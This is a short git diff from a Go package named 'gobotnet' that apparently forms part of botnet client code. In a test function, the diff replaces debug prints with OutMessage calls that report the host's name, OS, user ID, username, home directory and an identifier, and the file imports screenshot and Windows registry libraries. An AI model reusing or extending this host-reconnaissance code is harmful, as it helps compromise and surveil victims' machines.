@@ -3,16 +3,11 @@ package gobotnet
 import (
 	"bytes"
 	"encoding/base64"
-	//"errors"
-	"fmt"
 	"github.com/satori/go.uuid"
 	"github.com/vova616/screenshot"
 	"golang.org/x/sys/windows/registry"
 	"image"
 	"image/png"
-	//"io"
-	//"io/ioutil"
-	//"os"
 	"os/user"
 )
 
@@ -21,17 +16,14 @@ var (
 )
 
 func CmdTest() {
-	fmt.Println("CMD_EXEC.GO TEST")
-	// fmt.Println(GetName())
-	fmt.Println(GetOS())
-	// fmt.Println(GetUid())
-	// fmt.Println(GetUsername())
-	// fmt.Println(GetHomeDir())
-	// fmt.Println(GetIdentificator())
-
-	// //image := GetScreenshot()
-	//bytes, _ := ImageToBytes(image)
-	//fmt.Println(bytes)
+	OutMessage("COMMAND TEST START")
+	OutMessage(GetName())
+	OutMessage(GetOS())
+	OutMessage(GetUid())
+	OutMessage(GetUsername())
+	OutMessage(GetHomeDir())
+	OutMessage(GetIdentificator())
+	OutMessage("COMMAND TEST END")
 }
 
 func GetIdentificator() string {
